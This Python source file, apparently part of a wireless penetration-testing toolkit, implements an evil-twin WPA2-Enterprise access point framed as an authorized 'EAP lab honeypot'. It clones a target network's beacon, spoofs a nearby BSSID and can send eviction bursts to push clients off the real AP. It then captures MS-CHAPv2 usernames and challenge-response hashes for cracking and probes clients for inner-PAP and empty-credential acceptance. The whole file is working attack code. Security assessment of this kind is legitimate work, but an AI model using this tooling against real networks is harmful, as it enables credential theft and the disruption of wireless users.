"""PEAP / MS-CHAPv2 EAP lab honeypot for authorized Enterprise assessments."""
from __future__ import annotations

import asyncio
import struct
import time
from contextlib import AsyncExitStack
from dataclasses import dataclass, field, replace
from pathlib import Path

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eap_lab_assessment import (
    ClientOutcome,
    EapLabClientRecord,
    order_eap_methods,
)
from wifit3.campaigns.eap_lab_config import EapLabLaunchConfig
from wifit3.campaigns.eap_lab_tls import ensure_lab_tls_material
from wifit3.campaigns.eviltwin.campaign import csa_target_channel, default_punt_modes
from wifit3.campaigns.eviltwin.punter import Punter
from wifit3.campaigns.open_probe_ap import OPEN_PROBE_TIMEOUT_S, OpenProbePhase
from wifit3.campaigns.peap_server import EapLabServerSession
from wifit3.chips.driver import FakeMacSupport
from wifit3.crack.mschapv2 import MsChapV2Capture
from wifit3.dot11.ap import assoc_resp, auth_resp, beacon_clone_enterprise, probe_resp_from_beacon
from wifit3.dot11.dhcp import (
    build_lab_ack,
    build_lab_offer,
    lab_dhcp_client_ip,
    parse_client_dhcp,
)
from wifit3.dot11.eap import EAP_FAILURE, EAP_RESPONSE
from wifit3.dot11.eapol import LLC_SNAP_EAPOL
from wifit3.dot11.ie import GENERIC_ENTERPRISE_RSN_IE, beacon_rsn_ie, force_eap_akm
from wifit3.dot11.mac import mac_to_str, str_to_mac
from wifit3.dot11.parser import WlanFrameParser
from wifit3.dot11.probe import probe_resp, wpa2_beacon
from wifit3.models import AccessPoint
from wifit3.persist.config import Config
from wifit3.persist.private_files import ensure_private_directory
from wifit3.wlan.array import fake_mac_rank

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000


@dataclass(slots=True)
class PeapClientState:
    phase: OpenProbePhase = OpenProbePhase.WAITING
    session: EapLabServerSession | None = None
    captures: list[MsChapV2Capture] = field(default_factory=list)
    record: EapLabClientRecord | None = None
    dhcp_offered_ip: str | None = None
    dhcp_xid: int | None = None
    dhcp_acked: bool = False


class PeapHoneypotCampaign(Campaign):
    key = "peap-honeypot"
    idle_label = "EAP Lab"
    run_label = "Stop EAP Lab"

    def __init__(
        self,
        array,
        ap: AccessPoint,
        *,
        timeout: float = OPEN_PROBE_TIMEOUT_S * 5,
        bssid: bytes | None = None,
        launch: EapLabLaunchConfig | None = None,
    ) -> None:
        super().__init__(ap, array)
        self.target_ap = ap
        self._launch = launch or EapLabLaunchConfig(timeout=int(timeout))
        if timeout != self._launch.timeout:
            self._launch = replace(self._launch, timeout=int(timeout))
        self.ssid = ap.ssid or ""
        self.channel = ap.channel
        self.timeout = max(30.0, float(self._launch.timeout))
        self.result = "no-interface"
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self._events: list[str] = []
        self._tx_tasks: set[asyncio.Task] = set()
        self._rx_bindings: list[tuple] = []
        self._clients: dict[str, PeapClientState] = {}
        self._saved_keys: set[tuple[str, str, str]] = set()
        self.pending_captures: list[MsChapV2Capture] = []
        self.bssid = bssid or self._derive_lab_bssid(ap.bssid)
        self.bssid_text = mac_to_str(self.bssid)

        pmf_capable = bool(ap.pmf_capable or ap.pmf_required)
        real_beacon = ap.last_beacon_frame
        if real_beacon:
            self.beacon = beacon_clone_enterprise(
                real_beacon,
                self.channel,
                self.bssid,
                pmf_capable=pmf_capable,
                narrow_to_20mhz=False,
            )
            self.probe_response = probe_resp_from_beacon(self.beacon)
            self.rsn_ie = beacon_rsn_ie(self.beacon) or GENERIC_ENTERPRISE_RSN_IE
            self.rsn_source = "cloned target beacon (Enterprise RSN)"
        else:
            rsn_ie = getattr(ap, "rsn_ie", None)
            if rsn_ie:
                self.rsn_ie = force_eap_akm(rsn_ie, pmf_capable=pmf_capable) or GENERIC_ENTERPRISE_RSN_IE
                self.rsn_source = "parsed Enterprise RSN (no live beacon)"
            else:
                self.rsn_ie = GENERIC_ENTERPRISE_RSN_IE
                self.rsn_source = "generic 802.1X/CCMP"
            self.probe_response = probe_resp(
                self.bssid, self.ssid, self.channel, self.rsn_ie, b"",
            )
            self.beacon = wpa2_beacon(
                self.bssid, self.ssid, self.channel, self.rsn_ie, b"",
            )

        lab_dir = Path(Config.captures_dir).parent / "eap_lab"
        ensure_private_directory(lab_dir)
        self._tls_material = ensure_lab_tls_material(
            lab_dir,
            request_client_cert=self._launch.request_client_cert,
        )
        self._punter: Punter | None = None
        if self._launch.eviction and ap.last_beacon_frame:
            modes = default_punt_modes(ap)
            csa_channel = csa_target_channel(ap.channel, ap.channel)
            self._punter = Punter(
                modes,
                ap.last_beacon_frame,
                str_to_mac(ap.bssid),
                csa_channel,
                self.bssid,
                ap.channel,
                ap.channel,
            )

        self.stats = type("Stats", (), {"events": self._events, "phase": OpenProbePhase.WAITING})()

    @staticmethod
    def _derive_lab_bssid(real_bssid: str) -> bytes:
        raw = bytearray(str_to_mac(real_bssid))
        raw[0] |= 0x02
        raw[5] = (raw[5] + 1) & 0xFF
        return bytes(raw)

    def _spoofable_candidates(self) -> list:
        if self.array is None:
            return []
        return [
            member
            for member in self.array.members
            if self.channel in member.supported_channels
            and member.driver.FAKE_MAC is FakeMacSupport.SPOOFABLE
        ]

    @property
    def iface(self):
        if self._iface is None and self.array is not None:
            candidates = self._spoofable_candidates()
            preferred = self.array.preferred
            self._iface = (
                preferred
                if preferred in candidates
                else min(candidates, key=fake_mac_rank, default=None)
            )
        return self._iface

    async def _loop(self) -> None:
        if self.iface is None:
            return
        self.result = "running"
        self.started_at = time.monotonic()
        self._event(
            f"EAP lab started · {self.ssid} · CH {self.channel} · "
            f"{self.iface.name} · BSSID {self.bssid_text} · "
            f"PEAP/TTLS/TLS · {int(self.timeout)}s"
        )
        self._event(f"RSN profile · {self.rsn_source}")
        if self._launch.security_assessment:
            parts = ["client security assessment ON"]
            if self._launch.weak_outer_first:
                parts.append("weak outer EAP first")
            if self._launch.probe_inner_pap:
                parts.append("inner PAP probe")
            if self._launch.probe_empty_mschap:
                parts.append("empty MS-CHAPv2 probe")
            if self._launch.lab_dhcp:
                parts.append("lab DHCP Offer/ACK")
            self._event(" · ".join(parts))
        if self._punter is not None:
            mode_text = "+".join(mode.value for mode in self._punter.modes)
            self._event(
                f"Eviction enabled · {mode_text} every {int(self._launch.punt_period_sec)}s"
            )
        elif self._launch.eviction:
            self._event("Eviction requested but no target beacon is available")
        own_ap = self.array.register_own_fake_ap(
            self.bssid_text,
            self.ssid,
            self.channel,
            "WPA2-EAP",
        )
        own_ap.last_beacon_frame = self.beacon
        own_ap.akms = ["EAP"]
        own_ap.akm_suites = [1]
        self.array.register_own_mac(self.bssid)
        async with AsyncExitStack() as stack:
            await stack.enter_async_context(self.array.claim(self.iface))
            await stack.enter_async_context(
                self.array.lease(
                    channel=self.channel,
                    fake_mac=self.bssid,
                    bssid=self.bssid,
                    iface=self.iface,
                ),
            )
            callback = self._rx_callback
            self.iface.register_rx_callback(callback)
            self._rx_bindings.append((self.iface, callback))
            try:
                deadline = self.started_at + self.timeout
                last_punt = 0.0
                while not self.stopped and time.monotonic() < deadline:
                    beacon = self._restamp(self.beacon)
                    if await self.iface.send_no_wait(beacon):
                        self.array.record_own_fake_ap_beacon(self.bssid_text)
                    now = time.monotonic()
                    if (
                        self._punter is not None
                        and now - last_punt >= self._launch.punt_period_sec
                    ):
                        await self._punter.punt(self.iface, self._target_clients())
                        last_punt = now
                        self._event("Eviction burst sent toward lab twin")
                    await asyncio.sleep(_BEACON_PERIOD_S)
            finally:
                self.iface.unregister_rx_callback(callback)
                self._rx_bindings.clear()
                await self._drain_tx_tasks()
        self.array.finish_own_fake_ap(self.bssid_text)
        self.array.unregister_own_mac(self.bssid)
        self.finished_at = time.monotonic()
        misconfigured = any(
            state.record is not None
            and state.record.outcome not in (ClientOutcome.UNKNOWN, ClientOutcome.REJECTED_LAB)
            for state in self._clients.values()
        )
        if self.pending_captures:
            self.result = "captured"
        elif misconfigured:
            self.result = "misconfigured"
        else:
            self.result = "stopped" if self.stopped else "timeout"

    async def teardown(self) -> None:
        await self._drain_tx_tasks()
        for radio, callback in self._rx_bindings:
            radio.unregister_rx_callback(callback)
        self._rx_bindings.clear()
        self.finished_at = self.finished_at or time.monotonic()

    def _rx_callback(self, packet) -> None:
        self._dispatch(packet)

    def _dispatch(self, packet) -> None:
        raw = getattr(packet, "raw", b"")
        if len(raw) < 24:
            return
        source = raw[10:16]
        source_text = mac_to_str(source)
        if getattr(packet, "type_id", -1) == 2:
            if raw[4:10] == self.bssid or raw[16:22] == self.bssid:
                self._on_data(packet, source, source_text)
            return
        if getattr(packet, "type_id", -1) != 0:
            return
        subtype = getattr(packet, "subtype_id", -1)
        if subtype == 0x04:
            self._on_probe(source)
            return
        if raw[4:10] != self.bssid:
            return
        if subtype == 0x0B:
            self._event(f"CLIENT {source_text} · Open-System authentication")
            self._advance(source_text, OpenProbePhase.AUTHENTICATED)
            self._tx(auth_resp(self.bssid, source))
        elif subtype in (0x00, 0x02):
            self._event(f"CLIENT {source_text} · associated to Enterprise lab AP")
            self._advance(source_text, OpenProbePhase.ASSOCIATED)
            self._tx(assoc_resp(self.bssid, source, channel=self.channel))
            state = self._clients.setdefault(source_text, PeapClientState())
            state.session = self._new_session()

    def _on_data(self, packet, source: bytes, source_text: str) -> None:
        state = self._clients.get(source_text)
        if state is None or state.phase < OpenProbePhase.ASSOCIATED:
            return
        raw = packet.raw
        parsed_dhcp = parse_client_dhcp(raw, source)
        if parsed_dhcp is not None:
            dhcp_msg, xid = parsed_dhcp
            record = self._client_record(source_text)
            if self._launch.lab_dhcp and self._launch.security_assessment:
                offered = state.dhcp_offered_ip or lab_dhcp_client_ip(source)
                if dhcp_msg == "discover":
                    state.dhcp_offered_ip = offered
                    state.dhcp_xid = xid
                    self._tx(build_lab_offer(self.bssid, source, xid, offered_ip=offered))
                    record.dhcp_offered_ip = offered
                    record.add_finding("dhcp_discover_on_lab")
                    record.set_outcome(ClientOutcome.DHCP_ON_LAB)
                    self._event(
                        f"CLIENT {source_text} · MISCONFIG · lab DHCP Offer {offered}"
                    )
                elif dhcp_msg == "request" and not state.dhcp_acked:
                    state.dhcp_acked = True
                    ack_ip = state.dhcp_offered_ip or offered
                    self._tx(build_lab_ack(self.bssid, source, xid, ack_ip))
                    record.dhcp_offered_ip = ack_ip
                    record.add_finding("dhcp_ack_on_lab")
                    record.set_outcome(ClientOutcome.DHCP_ON_LAB)
                    self._event(
                        f"CLIENT {source_text} · MISCONFIG · lab DHCP ACK {ack_ip}"
                    )
            else:
                label = "Discover" if dhcp_msg == "discover" else "Request"
                self._event(
                    f"CLIENT {source_text} · DHCP {label} on lab BSS (lab DHCP disabled)"
                )
            self._advance(source_text, OpenProbePhase.DHCP)
            return
        sig_idx = raw.find(LLC_SNAP_EAPOL)
        if sig_idx == -1 or len(raw) < sig_idx + 12:
            return
        dot1x = sig_idx + 8
        dot1x_type = raw[dot1x + 1]
        if state.session is None:
            state.session = self._new_session()
        if dot1x_type == 1:
            result = state.session.on_eapol_start(self.bssid, source)
            self._send_session_result(source_text, result)
            return
        parsed = WlanFrameParser.parse_80211_frame(raw, 0)
        if getattr(parsed, "type", "") != "eapol" or not hasattr(parsed, "eap_code"):
            return
        if parsed.eap_code not in (EAP_RESPONSE, EAP_FAILURE):
            return
        result = state.session.on_eap(self.bssid, source, parsed)
        self._send_session_result(source_text, result)

    def _send_session_result(self, client_text: str, result) -> None:
        for frame in result.outgoing:
            self._tx(frame)
        record = self._client_record(client_text)
        assess = self._launch.security_assessment
        if result.eap_method is not None:
            record.outer_eap_method = result.eap_method
        if result.capture is not None:
            key = (
                result.capture.username.casefold(),
                result.capture.server_challenge.hex(),
                result.capture.nt_response.hex(),
            )
            if key not in self._saved_keys:
                self._saved_keys.add(key)
                state = self._clients.setdefault(client_text, PeapClientState())
                state.captures.append(result.capture)
                self.pending_captures.append(result.capture)
                self._advance(client_text, OpenProbePhase.EAPOL_M2)
                record.username = result.capture.username
                if result.misconfiguration == "empty_mschap_accepted":
                    record.add_finding("empty_mschap_accepted", detail=result.detail)
                    record.set_outcome(ClientOutcome.EMPTY_MSCHAP)
                else:
                    record.add_finding("untrusted_server_mschapv2")
                    record.set_outcome(ClientOutcome.INNER_CAPTURED)
                if assess:
                    self._event(
                        f"CLIENT {client_text} · MISCONFIG · MS-CHAPv2 · "
                        f"{result.capture.username}"
                    )
        elif result.complete:
            if result.misconfiguration == "inner_pap_accepted":
                record.add_finding("inner_pap_accepted", detail=result.detail)
                record.set_outcome(ClientOutcome.INNER_PAP)
            elif result.misconfiguration == "untrusted_server_eap_tls":
                record.add_finding("untrusted_server_eap_tls", detail=result.detail)
                record.set_outcome(ClientOutcome.EAP_SUCCESS)
            else:
                record.add_finding("rogue_eap_success", detail=result.detail)
                record.set_outcome(ClientOutcome.EAP_SUCCESS)
            if assess:
                self._event(
                    f"CLIENT {client_text} · MISCONFIG · completed rogue EAP "
                    f"({result.detail or 'EAP-Success'})"
                )
        if result.detail:
            record.last_detail = result.detail
            self._event(f"CLIENT {client_text} · {result.detail}")
        if result.client_cert_fingerprint:
            record.client_cert_sha256 = result.client_cert_fingerprint
            record.add_finding("eap_tls_client_cert_present")
            self._event(
                f"CLIENT {client_text} · EAP-TLS client certificate observed · "
                f"SHA-256 {result.client_cert_fingerprint[:16]}…"
            )
        if result.failed:
            if result.rejected_lab:
                record.set_outcome(ClientOutcome.REJECTED_LAB)
                record.add_finding("rejected_lab_tls", detail=result.detail)
                self._event(
                    f"CLIENT {client_text} · rejected lab (expected) · {result.detail}"
                )
            else:
                self._event(f"CLIENT {client_text} · EAP negotiation failed")

    def _client_record(self, client_text: str) -> EapLabClientRecord:
        state = self._clients.setdefault(client_text, PeapClientState())
        if state.record is None:
            state.record = EapLabClientRecord(client_mac=client_text)
        return state.record

    @property
    def launch(self) -> EapLabLaunchConfig:
        return self._launch

    @property
    def client_assessments(self) -> tuple[EapLabClientRecord, ...]:
        records = [
            state.record
            for state in self._clients.values()
            if state.record is not None
        ]
        return tuple(records)

    def _new_session(self) -> EapLabServerSession:
        methods = self._launch.eap_methods
        if self._launch.security_assessment and self._launch.weak_outer_first:
            methods = order_eap_methods(methods, weak_outer_first=True)
        return EapLabServerSession(
            self._tls_material,
            eap_methods=methods,
            launch=self._launch,
        )

    def _target_clients(self) -> list[bytes]:
        target = self.target_ap.bssid.casefold()
        return [
            str_to_mac(client.mac)
            for client in self.array.clients.values()
            if (client.bssid or "").casefold() == target
        ]

    def _on_probe(self, source: bytes) -> None:
        stamped = self._restamp(self.probe_response)
        response = stamped[:4] + source + stamped[10:]
        self._tx(response)

    def _advance(self, client_text: str, phase: OpenProbePhase) -> None:
        state = self._clients.setdefault(client_text, PeapClientState())
        if phase > state.phase:
            state.phase = phase
            self.stats.phase = max(self.stats.phase, phase)

    def _event(self, message: str) -> None:
        self._events.append(message)

    def _tx(self, frame: bytes) -> None:
        task = asyncio.create_task(self.iface.send_no_wait(frame))
        self._tx_tasks.add(task)
        task.add_done_callback(self._tx_tasks.discard)

    async def _drain_tx_tasks(self) -> None:
        pending = [task for task in self._tx_tasks if not task.done()]
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
        self._tx_tasks.clear()

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]
